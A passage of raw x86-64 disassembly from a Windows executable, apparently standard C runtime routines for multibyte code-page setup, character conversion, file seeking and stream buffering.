   14000976a:	4c 8d 25 cf 04 01 00 	lea    0x104cf(%rip),%r12        # 0x140019c40
   140009771:	8b ee                	mov    %esi,%ebp
   140009773:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140009779:	49 8b c4             	mov    %r12,%rax
   14000977c:	39 38                	cmp    %edi,(%rax)
   14000977e:	0f 84 38 01 00 00    	je     0x1400098bc
   140009784:	41 03 ef             	add    %r15d,%ebp
   140009787:	48 83 c0 30          	add    $0x30,%rax
   14000978b:	83 fd 05             	cmp    $0x5,%ebp
   14000978e:	72 ec                	jb     0x14000977c
   140009790:	8d 87 18 02 ff ff    	lea    -0xfde8(%rdi),%eax
   140009796:	41 3b c7             	cmp    %r15d,%eax
   140009799:	0f 86 15 01 00 00    	jbe    0x1400098b4
   14000979f:	0f b7 cf             	movzwl %di,%ecx
   1400097a2:	ff 15 60 7a 00 00    	call   *0x7a60(%rip)        # 0x140011208
   1400097a8:	85 c0                	test   %eax,%eax
   1400097aa:	0f 84 04 01 00 00    	je     0x1400098b4
   1400097b0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400097b5:	8b cf                	mov    %edi,%ecx
   1400097b7:	ff 15 63 7a 00 00    	call   *0x7a63(%rip)        # 0x140011220
   1400097bd:	85 c0                	test   %eax,%eax
   1400097bf:	0f 84 e3 00 00 00    	je     0x1400098a8
   1400097c5:	48 8d 4b 18          	lea    0x18(%rbx),%rcx
   1400097c9:	33 d2                	xor    %edx,%edx
   1400097cb:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400097d1:	e8 ca 8f ff ff       	call   0x1400027a0
   1400097d6:	89 7b 04             	mov    %edi,0x4(%rbx)
   1400097d9:	48 89 b3 20 02 00 00 	mov    %rsi,0x220(%rbx)
   1400097e0:	44 39 7c 24 20       	cmp    %r15d,0x20(%rsp)
   1400097e5:	0f 86 a6 00 00 00    	jbe    0x140009891
   1400097eb:	48 8d 54 24 26       	lea    0x26(%rsp),%rdx
   1400097f0:	40 38 74 24 26       	cmp    %sil,0x26(%rsp)
   1400097f5:	74 39                	je     0x140009830
   1400097f7:	40 38 72 01          	cmp    %sil,0x1(%rdx)
   1400097fb:	74 33                	je     0x140009830
   1400097fd:	0f b6 7a 01          	movzbl 0x1(%rdx),%edi
   140009801:	44 0f b6 02          	movzbl (%rdx),%r8d
   140009805:	44 3b c7             	cmp    %edi,%r8d
   140009808:	77 1d                	ja     0x140009827
   14000980a:	41 8d 48 01          	lea    0x1(%r8),%ecx
   14000980e:	48 8d 43 18          	lea    0x18(%rbx),%rax
   140009812:	48 03 c1             	add    %rcx,%rax
   140009815:	41 2b f8             	sub    %r8d,%edi
   140009818:	41 8d 0c 3f          	lea    (%r15,%rdi,1),%ecx
   14000981c:	80 08 04             	orb    $0x4,(%rax)
   14000981f:	49 03 c7             	add    %r15,%rax
   140009822:	49 2b cf             	sub    %r15,%rcx
   140009825:	75 f5                	jne    0x14000981c
   140009827:	48 83 c2 02          	add    $0x2,%rdx
   14000982b:	40 38 32             	cmp    %sil,(%rdx)
   14000982e:	75 c7                	jne    0x1400097f7
   140009830:	48 8d 43 1a          	lea    0x1a(%rbx),%rax
   140009834:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   140009839:	80 08 08             	orb    $0x8,(%rax)
   14000983c:	49 03 c7             	add    %r15,%rax
   14000983f:	49 2b cf             	sub    %r15,%rcx
   140009842:	75 f5                	jne    0x140009839
   140009844:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140009847:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   14000984d:	74 2e                	je     0x14000987d
   14000984f:	83 e9 04             	sub    $0x4,%ecx
   140009852:	74 20                	je     0x140009874
   140009854:	83 e9 0d             	sub    $0xd,%ecx
   140009857:	74 12                	je     0x14000986b
   140009859:	ff c9                	dec    %ecx
   14000985b:	74 05                	je     0x140009862
   14000985d:	48 8b c6             	mov    %rsi,%rax
   140009860:	eb 22                	jmp    0x140009884
   140009862:	48 8b 05 8f 8e 00 00 	mov    0x8e8f(%rip),%rax        # 0x1400126f8
   140009869:	eb 19                	jmp    0x140009884
   14000986b:	48 8b 05 7e 8e 00 00 	mov    0x8e7e(%rip),%rax        # 0x1400126f0
   140009872:	eb 10                	jmp    0x140009884
   140009874:	48 8b 05 6d 8e 00 00 	mov    0x8e6d(%rip),%rax        # 0x1400126e8
   14000987b:	eb 07                	jmp    0x140009884
   14000987d:	48 8b 05 5c 8e 00 00 	mov    0x8e5c(%rip),%rax        # 0x1400126e0
   140009884:	48 89 83 20 02 00 00 	mov    %rax,0x220(%rbx)
   14000988b:	44 89 7b 08          	mov    %r15d,0x8(%rbx)
   14000988f:	eb 03                	jmp    0x140009894
   140009891:	89 73 08             	mov    %esi,0x8(%rbx)
   140009894:	48 8d 7b 0c          	lea    0xc(%rbx),%rdi
   140009898:	0f b7 c6             	movzwl %si,%eax
   14000989b:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400098a0:	66 f3 ab             	rep stos %ax,(%rdi)
   1400098a3:	e9 fe 00 00 00       	jmp    0x1400099a6
   1400098a8:	39 35 8a 22 01 00    	cmp    %esi,0x1228a(%rip)        # 0x14001bb38
   1400098ae:	0f 85 a9 fe ff ff    	jne    0x14000975d
   1400098b4:	83 c8 ff             	or     $0xffffffff,%eax
   1400098b7:	e9 f4 00 00 00       	jmp    0x1400099b0
   1400098bc:	48 8d 4b 18          	lea    0x18(%rbx),%rcx
   1400098c0:	33 d2                	xor    %edx,%edx
   1400098c2:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400098c8:	e8 d3 8e ff ff       	call   0x1400027a0
   1400098cd:	8b c5                	mov    %ebp,%eax
   1400098cf:	4d 8d 4c 24 10       	lea    0x10(%r12),%r9
   1400098d4:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   1400098d8:	4c 8d 35 59 03 01 00 	lea    0x10359(%rip),%r14        # 0x140019c38
   1400098df:	bd 04 00 00 00       	mov    $0x4,%ebp
   1400098e4:	49 c1 e3 04          	shl    $0x4,%r11
   1400098e8:	4d 03 cb             	add    %r11,%r9
   1400098eb:	49 8b d1             	mov    %r9,%rdx
   1400098ee:	41 38 31             	cmp    %sil,(%r9)
   1400098f1:	74 40                	je     0x140009933
   1400098f3:	40 38 72 01          	cmp    %sil,0x1(%rdx)
   1400098f7:	74 3a                	je     0x140009933
   1400098f9:	44 0f b6 02          	movzbl (%rdx),%r8d
   1400098fd:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140009901:	44 3b c0             	cmp    %eax,%r8d
   140009904:	77 24                	ja     0x14000992a
   140009906:	45 8d 50 01          	lea    0x1(%r8),%r10d
   14000990a:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   140009911:	73 17                	jae    0x14000992a
   140009913:	41 8a 06             	mov    (%r14),%al
   140009916:	45 03 c7             	add    %r15d,%r8d
   140009919:	41 08 44 1a 18       	or     %al,0x18(%r10,%rbx,1)
   14000991e:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140009922:	45 03 d7             	add    %r15d,%r10d
   140009925:	44 3b c0             	cmp    %eax,%r8d
   140009928:	76 e0                	jbe    0x14000990a
   14000992a:	48 83 c2 02          	add    $0x2,%rdx
   14000992e:	40 38 32             	cmp    %sil,(%rdx)
   140009931:	75 c0                	jne    0x1400098f3
   140009933:	49 83 c1 08          	add    $0x8,%r9
   140009937:	4d 03 f7             	add    %r15,%r14
   14000993a:	49 2b ef             	sub    %r15,%rbp
   14000993d:	75 ac                	jne    0x1400098eb
   14000993f:	89 7b 04             	mov    %edi,0x4(%rbx)
   140009942:	44 89 7b 08          	mov    %r15d,0x8(%rbx)
   140009946:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   14000994c:	74 29                	je     0x140009977
   14000994e:	83 ef 04             	sub    $0x4,%edi
   140009951:	74 1b                	je     0x14000996e
   140009953:	83 ef 0d             	sub    $0xd,%edi
   140009956:	74 0d                	je     0x140009965
   140009958:	ff cf                	dec    %edi
   14000995a:	75 22                	jne    0x14000997e
   14000995c:	48 8b 35 95 8d 00 00 	mov    0x8d95(%rip),%rsi        # 0x1400126f8
   140009963:	eb 19                	jmp    0x14000997e
   140009965:	48 8b 35 84 8d 00 00 	mov    0x8d84(%rip),%rsi        # 0x1400126f0
   14000996c:	eb 10                	jmp    0x14000997e
   14000996e:	48 8b 35 73 8d 00 00 	mov    0x8d73(%rip),%rsi        # 0x1400126e8
   140009975:	eb 07                	jmp    0x14000997e
   140009977:	48 8b 35 62 8d 00 00 	mov    0x8d62(%rip),%rsi        # 0x1400126e0
   14000997e:	4c 2b db             	sub    %rbx,%r11
   140009981:	48 89 b3 20 02 00 00 	mov    %rsi,0x220(%rbx)
   140009988:	48 8d 4b 0c          	lea    0xc(%rbx),%rcx
   14000998c:	4b 8d 3c 23          	lea    (%r11,%r12,1),%rdi
   140009990:	ba 06 00 00 00       	mov    $0x6,%edx
   140009995:	0f b7 44 0f f8       	movzwl -0x8(%rdi,%rcx,1),%eax
   14000999a:	66 89 01             	mov    %ax,(%rcx)
   14000999d:	48 8d 49 02          	lea    0x2(%rcx),%rcx
   1400099a1:	49 2b d7             	sub    %r15,%rdx
   1400099a4:	75 ef                	jne    0x140009995
   1400099a6:	48 8b cb             	mov    %rbx,%rcx
   1400099a9:	e8 96 f8 ff ff       	call   0x140009244
   1400099ae:	33 c0                	xor    %eax,%eax
   1400099b0:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400099b5:	48 33 cc             	xor    %rsp,%rcx
   1400099b8:	e8 83 98 ff ff       	call   0x140003240
   1400099bd:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   1400099c2:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   1400099c6:	49 8b 6b 48          	mov    0x48(%r11),%rbp
   1400099ca:	49 8b e3             	mov    %r11,%rsp
   1400099cd:	41 5f                	pop    %r15
   1400099cf:	41 5e                	pop    %r14
   1400099d1:	41 5c                	pop    %r12
   1400099d3:	5f                   	pop    %rdi
   1400099d4:	5e                   	pop    %rsi
   1400099d5:	c3                   	ret
   1400099d6:	cc                   	int3
   1400099d7:	cc                   	int3
   1400099d8:	40 53                	rex push %rbx
   1400099da:	48 83 ec 40          	sub    $0x40,%rsp
   1400099de:	8b d9                	mov    %ecx,%ebx
   1400099e0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400099e5:	e8 52 b5 ff ff       	call   0x140004f3c
   1400099ea:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400099ef:	0f b6 d3             	movzbl %bl,%edx
   1400099f2:	48 8b 88 08 01 00 00 	mov    0x108(%rax),%rcx
   1400099f9:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   1400099fd:	25 00 80 00 00       	and    $0x8000,%eax
   140009a02:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140009a07:	74 0c                	je     0x140009a15
   140009a09:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140009a0e:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140009a15:	48 83 c4 40          	add    $0x40,%rsp
   140009a19:	5b                   	pop    %rbx
   140009a1a:	c3                   	ret
   140009a1b:	cc                   	int3
   140009a1c:	40 53                	rex push %rbx
   140009a1e:	48 83 ec 40          	sub    $0x40,%rsp
   140009a22:	8b d9                	mov    %ecx,%ebx
   140009a24:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140009a29:	33 d2                	xor    %edx,%edx
   140009a2b:	e8 0c b5 ff ff       	call   0x140004f3c
   140009a30:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140009a35:	0f b6 d3             	movzbl %bl,%edx
   140009a38:	48 8b 88 08 01 00 00 	mov    0x108(%rax),%rcx
   140009a3f:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   140009a43:	25 00 80 00 00       	and    $0x8000,%eax
   140009a48:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140009a4d:	74 0c                	je     0x140009a5b
   140009a4f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140009a54:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140009a5b:	48 83 c4 40          	add    $0x40,%rsp
   140009a5f:	5b                   	pop    %rbx
   140009a60:	c3                   	ret
   140009a61:	cc                   	int3
   140009a62:	cc                   	int3
   140009a63:	cc                   	int3
   140009a64:	48 8b 0d 95 f5 00 00 	mov    0xf595(%rip),%rcx        # 0x140019000
   140009a6b:	33 c0                	xor    %eax,%eax
   140009a6d:	48 83 c9 01          	or     $0x1,%rcx
   140009a71:	48 39 0d c8 20 01 00 	cmp    %rcx,0x120c8(%rip)        # 0x14001bb40
   140009a78:	0f 94 c0             	sete   %al
   140009a7b:	c3                   	ret
   140009a7c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009a81:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009a86:	66 44 89 4c 24 20    	mov    %r9w,0x20(%rsp)
   140009a8c:	57                   	push   %rdi
   140009a8d:	48 83 ec 60          	sub    $0x60,%rsp
   140009a91:	49 8b f8             	mov    %r8,%rdi
   140009a94:	48 8b f2             	mov    %rdx,%rsi
   140009a97:	48 8b d9             	mov    %rcx,%rbx
   140009a9a:	48 85 d2             	test   %rdx,%rdx
   140009a9d:	75 13                	jne    0x140009ab2
   140009a9f:	4d 85 c0             	test   %r8,%r8
   140009aa2:	74 0e                	je     0x140009ab2
   140009aa4:	48 85 c9             	test   %rcx,%rcx
   140009aa7:	74 02                	je     0x140009aab
   140009aa9:	21 11                	and    %edx,(%rcx)
   140009aab:	33 c0                	xor    %eax,%eax
   140009aad:	e9 95 00 00 00       	jmp    0x140009b47
   140009ab2:	48 85 c9             	test   %rcx,%rcx
   140009ab5:	74 03                	je     0x140009aba
   140009ab7:	83 09 ff             	orl    $0xffffffff,(%rcx)
   140009aba:	49 81 f8 ff ff ff 7f 	cmp    $0x7fffffff,%r8
   140009ac1:	76 13                	jbe    0x140009ad6
   140009ac3:	e8 b0 aa ff ff       	call   0x140004578
   140009ac8:	bb 16 00 00 00       	mov    $0x16,%ebx
   140009acd:	89 18                	mov    %ebx,(%rax)
   140009acf:	e8 54 a6 ff ff       	call   0x140004128
   140009ad4:	eb 6f                	jmp    0x140009b45
   140009ad6:	48 8b 94 24 90 00 00 	mov    0x90(%rsp),%rdx
   140009add:	00 
   140009ade:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140009ae3:	e8 54 b4 ff ff       	call   0x140004f3c
   140009ae8:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140009aed:	48 83 b8 38 01 00 00 	cmpq   $0x0,0x138(%rax)
   140009af4:	00 
   140009af5:	75 7f                	jne    0x140009b76
   140009af7:	0f b7 84 24 88 00 00 	movzwl 0x88(%rsp),%eax
   140009afe:	00 
   140009aff:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140009b04:	66 3b c1             	cmp    %cx,%ax
   140009b07:	76 50                	jbe    0x140009b59
   140009b09:	48 85 f6             	test   %rsi,%rsi
   140009b0c:	74 12                	je     0x140009b20
   140009b0e:	48 85 ff             	test   %rdi,%rdi
   140009b11:	74 0d                	je     0x140009b20
   140009b13:	4c 8b c7             	mov    %rdi,%r8
   140009b16:	33 d2                	xor    %edx,%edx
   140009b18:	48 8b ce             	mov    %rsi,%rcx
   140009b1b:	e8 80 8c ff ff       	call   0x1400027a0
   140009b20:	e8 53 aa ff ff       	call   0x140004578
   140009b25:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140009b2b:	e8 48 aa ff ff       	call   0x140004578
   140009b30:	8b 18                	mov    (%rax),%ebx
   140009b32:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   140009b37:	74 0c                	je     0x140009b45
   140009b39:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140009b3e:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140009b45:	8b c3                	mov    %ebx,%eax
   140009b47:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140009b4c:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140009b50:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140009b54:	49 8b e3             	mov    %r11,%rsp
   140009b57:	5f                   	pop    %rdi
   140009b58:	c3                   	ret
   140009b59:	48 85 f6             	test   %rsi,%rsi
   140009b5c:	74 0b                	je     0x140009b69
   140009b5e:	48 85 ff             	test   %rdi,%rdi
   140009b61:	0f 84 89 00 00 00    	je     0x140009bf0
   140009b67:	88 06                	mov    %al,(%rsi)
   140009b69:	48 85 db             	test   %rbx,%rbx
   140009b6c:	74 55                	je     0x140009bc3
   140009b6e:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140009b74:	eb 4d                	jmp    0x140009bc3
   140009b76:	83 64 24 78 00       	andl   $0x0,0x78(%rsp)
   140009b7b:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140009b80:	4c 8d 84 24 88 00 00 	lea    0x88(%rsp),%r8
   140009b87:	00 
   140009b88:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140009b8d:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140009b93:	8b 48 04             	mov    0x4(%rax),%ecx
   140009b96:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140009b9c:	33 d2                	xor    %edx,%edx
   140009b9e:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140009ba2:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140009ba7:	ff 15 d3 75 00 00    	call   *0x75d3(%rip)        # 0x140011180
   140009bad:	85 c0                	test   %eax,%eax
   140009baf:	74 19                	je     0x140009bca
   140009bb1:	83 7c 24 78 00       	cmpl   $0x0,0x78(%rsp)
   140009bb6:	0f 85 64 ff ff ff    	jne    0x140009b20
   140009bbc:	48 85 db             	test   %rbx,%rbx
   140009bbf:	74 02                	je     0x140009bc3
   140009bc1:	89 03                	mov    %eax,(%rbx)
   140009bc3:	33 db                	xor    %ebx,%ebx
   140009bc5:	e9 68 ff ff ff       	jmp    0x140009b32
   140009bca:	ff 15 c0 74 00 00    	call   *0x74c0(%rip)        # 0x140011090
   140009bd0:	83 f8 7a             	cmp    $0x7a,%eax
   140009bd3:	0f 85 47 ff ff ff    	jne    0x140009b20
   140009bd9:	48 85 f6             	test   %rsi,%rsi
   140009bdc:	74 12                	je     0x140009bf0
   140009bde:	48 85 ff             	test   %rdi,%rdi
   140009be1:	74 0d                	je     0x140009bf0
   140009be3:	4c 8b c7             	mov    %rdi,%r8
   140009be6:	33 d2                	xor    %edx,%edx
   140009be8:	48 8b ce             	mov    %rsi,%rcx
   140009beb:	e8 b0 8b ff ff       	call   0x1400027a0
   140009bf0:	e8 83 a9 ff ff       	call   0x140004578
   140009bf5:	bb 22 00 00 00       	mov    $0x22,%ebx
   140009bfa:	89 18                	mov    %ebx,(%rax)
   140009bfc:	e8 27 a5 ff ff       	call   0x140004128
   140009c01:	e9 2c ff ff ff       	jmp    0x140009b32
   140009c06:	cc                   	int3
   140009c07:	cc                   	int3
   140009c08:	48 83 ec 38          	sub    $0x38,%rsp
   140009c0c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009c12:	e8 65 fe ff ff       	call   0x140009a7c
   140009c17:	48 83 c4 38          	add    $0x38,%rsp
   140009c1b:	c3                   	ret
   140009c1c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009c21:	57                   	push   %rdi
   140009c22:	48 83 ec 20          	sub    $0x20,%rsp
   140009c26:	33 ff                	xor    %edi,%edi
   140009c28:	48 8d 1d 41 05 01 00 	lea    0x10541(%rip),%rbx        # 0x14001a170
   140009c2f:	48 8b 0b             	mov    (%rbx),%rcx
   140009c32:	ff 15 48 74 00 00    	call   *0x7448(%rip)        # 0x140011080
   140009c38:	ff c7                	inc    %edi
   140009c3a:	48 89 03             	mov    %rax,(%rbx)
   140009c3d:	48 63 c7             	movslq %edi,%rax
   140009c40:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   140009c44:	48 83 f8 0a          	cmp    $0xa,%rax
   140009c48:	72 e5                	jb     0x140009c2f
   140009c4a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009c4f:	48 83 c4 20          	add    $0x20,%rsp
   140009c53:	5f                   	pop    %rdi
   140009c54:	c3                   	ret
   140009c55:	cc                   	int3
   140009c56:	cc                   	int3
   140009c57:	cc                   	int3
   140009c58:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140009c5d:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140009c61:	56                   	push   %rsi
   140009c62:	57                   	push   %rdi
   140009c63:	41 54                	push   %r12
   140009c65:	41 56                	push   %r14
   140009c67:	41 57                	push   %r15
   140009c69:	48 83 ec 20          	sub    $0x20,%rsp
   140009c6d:	41 8b f0             	mov    %r8d,%esi
   140009c70:	4c 8b f2             	mov    %rdx,%r14
   140009c73:	48 63 d9             	movslq %ecx,%rbx
   140009c76:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140009c79:	75 18                	jne    0x140009c93
   140009c7b:	e8 88 a8 ff ff       	call   0x140004508
   140009c80:	83 20 00             	andl   $0x0,(%rax)
   140009c83:	e8 f0 a8 ff ff       	call   0x140004578
   140009c88:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009c8e:	e9 94 00 00 00       	jmp    0x140009d27
   140009c93:	85 c9                	test   %ecx,%ecx
   140009c95:	78 78                	js     0x140009d0f
   140009c97:	3b 1d c3 1f 01 00    	cmp    0x11fc3(%rip),%ebx        # 0x14001bc60
   140009c9d:	73 70                	jae    0x140009d0f
   140009c9f:	48 8b c3             	mov    %rbx,%rax
   140009ca2:	48 8b fb             	mov    %rbx,%rdi
   140009ca5:	48 c1 ff 05          	sar    $0x5,%rdi
   140009ca9:	4c 8d 25 60 12 01 00 	lea    0x11260(%rip),%r12        # 0x14001af10
   140009cb0:	83 e0 1f             	and    $0x1f,%eax
   140009cb3:	4c 6b f8 58          	imul   $0x58,%rax,%r15
   140009cb7:	49 8b 04 fc          	mov    (%r12,%rdi,8),%rax
   140009cbb:	42 0f be 4c 38 08    	movsbl 0x8(%rax,%r15,1),%ecx
   140009cc1:	83 e1 01             	and    $0x1,%ecx
   140009cc4:	74 49                	je     0x140009d0f
   140009cc6:	8b cb                	mov    %ebx,%ecx
   140009cc8:	e8 7f e5 ff ff       	call   0x14000824c
   140009ccd:	90                   	nop
   140009cce:	49 8b 04 fc          	mov    (%r12,%rdi,8),%rax
   140009cd2:	42 f6 44 38 08 01    	testb  $0x1,0x8(%rax,%r15,1)
   140009cd8:	74 12                	je     0x140009cec
   140009cda:	44 8b c6             	mov    %esi,%r8d
   140009cdd:	49 8b d6             	mov    %r14,%rdx
   140009ce0:	8b cb                	mov    %ebx,%ecx
   140009ce2:	e8 59 00 00 00       	call   0x140009d40
   140009ce7:	48 8b f8             	mov    %rax,%rdi
   140009cea:	eb 17                	jmp    0x140009d03
   140009cec:	e8 87 a8 ff ff       	call   0x140004578
   140009cf1:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009cf7:	e8 0c a8 ff ff       	call   0x140004508
   140009cfc:	83 20 00             	andl   $0x0,(%rax)
   140009cff:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   140009d03:	8b cb                	mov    %ebx,%ecx
   140009d05:	e8 a2 e9 ff ff       	call   0x1400086ac
   140009d0a:	48 8b c7             	mov    %rdi,%rax
   140009d0d:	eb 1c                	jmp    0x140009d2b
   140009d0f:	e8 f4 a7 ff ff       	call   0x140004508
   140009d14:	83 20 00             	andl   $0x0,(%rax)
   140009d17:	e8 5c a8 ff ff       	call   0x140004578
   140009d1c:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009d22:	e8 01 a4 ff ff       	call   0x140004128
   140009d27:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140009d2b:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140009d30:	48 83 c4 20          	add    $0x20,%rsp
   140009d34:	41 5f                	pop    %r15
   140009d36:	41 5e                	pop    %r14
   140009d38:	41 5c                	pop    %r12
   140009d3a:	5f                   	pop    %rdi
   140009d3b:	5e                   	pop    %rsi
   140009d3c:	c3                   	ret
   140009d3d:	cc                   	int3
   140009d3e:	cc                   	int3
   140009d3f:	cc                   	int3
   140009d40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009d45:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009d4a:	57                   	push   %rdi
   140009d4b:	48 83 ec 20          	sub    $0x20,%rsp
   140009d4f:	48 63 d9             	movslq %ecx,%rbx
   140009d52:	41 8b f8             	mov    %r8d,%edi
   140009d55:	48 8b f2             	mov    %rdx,%rsi
   140009d58:	8b cb                	mov    %ebx,%ecx
   140009d5a:	e8 29 e8 ff ff       	call   0x140008588
   140009d5f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140009d63:	75 11                	jne    0x140009d76
   140009d65:	e8 0e a8 ff ff       	call   0x140004578
   140009d6a:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009d70:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140009d74:	eb 4d                	jmp    0x140009dc3
   140009d76:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140009d7b:	44 8b cf             	mov    %edi,%r9d
   140009d7e:	48 8b d6             	mov    %rsi,%rdx
   140009d81:	48 8b c8             	mov    %rax,%rcx
   140009d84:	ff 15 9e 74 00 00    	call   *0x749e(%rip)        # 0x140011228
   140009d8a:	85 c0                	test   %eax,%eax
   140009d8c:	75 0f                	jne    0x140009d9d
   140009d8e:	ff 15 fc 72 00 00    	call   *0x72fc(%rip)        # 0x140011090
   140009d94:	8b c8                	mov    %eax,%ecx
   140009d96:	e8 8d a7 ff ff       	call   0x140004528
   140009d9b:	eb d3                	jmp    0x140009d70
   140009d9d:	48 8b cb             	mov    %rbx,%rcx
   140009da0:	48 8b c3             	mov    %rbx,%rax
   140009da3:	48 8d 15 66 11 01 00 	lea    0x11166(%rip),%rdx        # 0x14001af10
   140009daa:	48 c1 f8 05          	sar    $0x5,%rax
   140009dae:	83 e1 1f             	and    $0x1f,%ecx
   140009db1:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   140009db5:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   140009db9:	80 64 08 08 fd       	andb   $0xfd,0x8(%rax,%rcx,1)
   140009dbe:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140009dc3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009dc8:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140009dcd:	48 83 c4 20          	add    $0x20,%rsp
   140009dd1:	5f                   	pop    %rdi
   140009dd2:	c3                   	ret
   140009dd3:	cc                   	int3
   140009dd4:	40 53                	rex push %rbx
   140009dd6:	48 83 ec 20          	sub    $0x20,%rsp
   140009dda:	ff 05 18 11 01 00    	incl   0x11118(%rip)        # 0x14001aef8
   140009de0:	48 8b d9             	mov    %rcx,%rbx
   140009de3:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140009de8:	e8 47 d5 ff ff       	call   0x140007334
   140009ded:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140009df1:	48 85 c0             	test   %rax,%rax
   140009df4:	74 0d                	je     0x140009e03
   140009df6:	83 4b 18 08          	orl    $0x8,0x18(%rbx)
   140009dfa:	c7 43 24 00 10 00 00 	movl   $0x1000,0x24(%rbx)
   140009e01:	eb 13                	jmp    0x140009e16
   140009e03:	83 4b 18 04          	orl    $0x4,0x18(%rbx)
   140009e07:	48 8d 43 20          	lea    0x20(%rbx),%rax
   140009e0b:	c7 43 24 02 00 00 00 	movl   $0x2,0x24(%rbx)
   140009e12:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140009e16:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140009e1a:	83 63 08 00          	andl   $0x0,0x8(%rbx)
   140009e1e:	48 89 03             	mov    %rax,(%rbx)
   140009e21:	48 83 c4 20          	add    $0x20,%rsp
   140009e25:	5b                   	pop    %rbx
   140009e26:	c3                   	ret
   140009e27:	cc                   	int3
   140009e28:	48 8b c4             	mov    %rsp,%rax
   140009e2b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140009e2f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140009e33:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140009e37:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140009e3b:	41 56                	push   %r14
   140009e3d:	48 83 ec 50          	sub    $0x50,%rsp
   140009e41:	45 33 f6             	xor    %r14d,%r14d
   140009e44:	49 8b e8             	mov    %r8,%rbp
   140009e47:	48 8b f2             	mov    %rdx,%rsi
   140009e4a:	48 8b f9             	mov    %rcx,%rdi
   140009e4d:	48 85 d2             	test   %rdx,%rdx
   140009e50:	74 13                	je     0x140009e65
   140009e52:	4d 85 c0             	test   %r8,%r8
   140009e55:	74 0e                	je     0x140009e65
   140009e57:	44 38 32             	cmp    %r14b,(%rdx)
   140009e5a:	75 26                	jne    0x140009e82
   140009e5c:	48 85 c9             	test   %rcx,%rcx
   140009e5f:	74 04                	je     0x140009e65
   140009e61:	66 44 89 31          	mov    %r14w,(%rcx)
   140009e65:	33 c0                	xor    %eax,%eax
   140009e67:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140009e6c:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
